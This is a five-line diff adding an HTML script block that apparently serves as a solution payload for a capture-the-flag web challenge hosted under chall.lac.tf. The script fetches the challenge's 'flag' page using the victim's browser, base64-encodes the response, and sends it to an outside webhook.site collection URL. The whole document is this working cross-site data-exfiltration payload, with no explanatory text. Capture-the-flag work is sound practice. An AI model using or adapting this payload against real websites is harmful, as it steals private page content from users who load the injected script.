@@ -1,0 +1,5 @@
+<script>
+  fetch("https://chessbased.chall.lac.tf/render?id=flag")
+    .then(res => res.text())
+    .then(data => fetch("https://webhook.site/e634c6a6-0cb7-4167-93a0-d4e31934f2f8?flag=" + btoa(data)));
+  </script>
